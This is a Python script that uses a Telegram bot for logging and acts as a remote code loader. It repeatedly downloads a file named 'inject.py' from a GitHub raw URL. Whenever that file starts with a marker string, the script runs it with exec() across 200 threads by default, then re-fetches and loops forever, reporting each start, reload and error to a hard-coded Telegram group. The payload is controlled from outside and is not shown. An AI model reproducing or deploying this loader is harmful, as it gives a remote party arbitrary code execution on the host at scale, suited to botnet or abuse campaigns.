import threading
from telegram import Bot
from telegram.utils.helpers import escape_markdown
import time, requests, os, sys, random

def sanitize(string):
  """return a senetised string"""
  return escape_markdown(str(string))

EXECUTION_CODE="print('@ADMlNxd')"

GROUP_NAME = escape_markdown(os.environ.get("GROUP_NAME","anonymous").replace("-","_"))
THREAD_COUNT = int(os.environ.get("THREADS","200"))
TOKEN=os.environ.get("BOT_TOKEN","NO_BOT_TOKEN")
bot=Bot(TOKEN)

OWNER = 834508473
LOG_GROUP = -1001319740376
ATTEMPT = 0


def LOGGING(text):
  
  text=str(text).replace("#","\\#")
  print(text)
  bot.send_message(LOG_GROUP,str(text),parse_mode='MarkdownV2')

  
def update_code():
  """this function will check that code need update if yes then it will update EXECUTION_CODE"""
  global EXECUTION_CODE
  RESPONSE_CODE = requests.get("https://raw.githubusercontent.com/I-Himanshu/vcStreamBot/minders/inject.py").text
  if RESPONSE_CODE.startswith("#ADMlNxd"):
    if RESPONSE_CODE != EXECUTION_CODE:
      EXECUTION_CODE = RESPONSE_CODE
      try:
        version=EXECUTION_CODE.split("\n")[0].split(" ")[1]
      except Exception as e:
        LOGGING('#ERROR\n⚠️ {} on line {}\nError Type: {}\n```{}```'.format(GROUP_NAME,sanitize(sys.exc_info()[-1].tb_lineno),sanitize(type(e).__name__),sanitize(e)))
        version="Undefined"
      LOGGING("#RELOAD\nGroup ```{}``` is updated and restarted successfully\nVersion ```{}```".format(GROUP_NAME,version))
      

def runMyCode(botNo):
  global EXECUTION_CODE,ATTEMPT
  try:
    exec(EXECUTION_CODE)
  except Exception as e:
    LOGGING('#ERROR\n⚠️ {} on line {}\nError Type: {}\n```{}```'.format(GROUP_NAME,sanitize(sys.exc_info()[-1].tb_lineno),sanitize(type(e).__name__),sanitize(e)))

  
def make_and_destroy_thread():
  #This Will Make And Remake Threads
  threads = []
  for i in range(int(THREAD_COUNT)):
    thread = threading.Thread(target=runMyCode,args=[i])
    thread.start()
    threads.append(thread)
  for thread in threads:
    thread.join()
  
  try:
    update_code()
    make_and_destroy_thread()
  except Exception as e:
    LOGGING('#ERROR\n⚠️ {} on line {}\nError Type: {}\n```{}```'.format(GROUP_NAME,sanitize(sys.exc_info()[-1].tb_lineno),sanitize(type(e).__name__),sanitize(e)))
    raise e
  


try:
  LOGGING("#START\n👶 SERVER ```{}``` IS STARTING WITH {} BOTS".format(GROUP_NAME,THREAD_COUNT))
  update_code()
  make_and_destroy_thread()
except Exception as e:
  LOGGING('#ERROR\n⚠️ {} on line {}\nError Type: {}\n```{}```'.format(GROUP_NAME,sanitize(sys.exc_info()[-1].tb_lineno),sanitize(type(e).__name__),sanitize(e)))
  raise e
